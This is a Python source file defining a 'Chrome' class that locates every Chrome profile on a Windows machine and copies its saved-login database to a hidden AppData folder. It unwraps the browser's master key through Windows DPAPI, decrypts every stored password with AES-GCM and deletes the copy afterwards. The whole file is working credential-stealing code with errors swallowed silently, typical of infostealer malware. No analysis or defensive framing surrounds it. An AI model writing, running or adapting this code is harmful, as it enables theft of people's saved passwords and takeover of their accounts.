from Cryptodome.Cipher import AES
from shutil import copy2
import base64,win32crypt,json,os,subprocess,sqlite3

class Chrome(object):
    def _get_key(self):
        file = open(os.environ['USERPROFILE']+'\\AppData\\Local\Google\\Chrome\\User Data\\Local State', "r" ,encoding='iso-8859-1')
        data=file.read()
        data=json.loads(data)
        return win32crypt.CryptUnprotectData(base64.b64decode(data["os_crypt"]["encrypted_key"])[5:], None, None,None,0)[1]


    def _decrypt_password(self,key,iv,en_pass):
        try:
            return self.decryptgcm(key,iv,en_pass)[:-16].decode()
        except Exception as e:
            pass

    def cp_path(self,path,name):
        try:
            os.mkdir(os.environ['AppData']+'\\Process\\')
        except:
            pass
        copy2(path,os.environ['AppData']+'\\Process\\'+name)
        return os.environ['AppData']+'\\Process\\'+name


    def show(self):
        user_data=os.environ['USERPROFILE']+'\\AppData\\Local\\Google\\Chrome\\User Data\\'
        profiles = ["Default",'Guest profile']
        for i in os.listdir(user_data):
            if "Profile " in i:
                profiles.append(i)
        testpass = []
        for i in profiles:
            try:
                path_db = self.cp_path(user_data+i+'\\Login Data',i+' login.db') 
                conn = sqlite3.connect(path_db)
                cursor = conn.cursor()
            except Exception as e:
                pass
            try:
                cursor.execute("select password_value from logins")
            except Exception as e:
                pass
            try:
                for n in cursor.fetchall():
                    testpass.append(self._decrypt_password(self._get_key(),n[0][3:15],n[0][15:]))
            except Exception as e:
                pass
            try:
                cursor.close()
                conn.close()
                os.remove(path_db)
            except Exception as e:
                pass

        return testpass
        
    def decryptgcm(self,key,iv,data):
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)
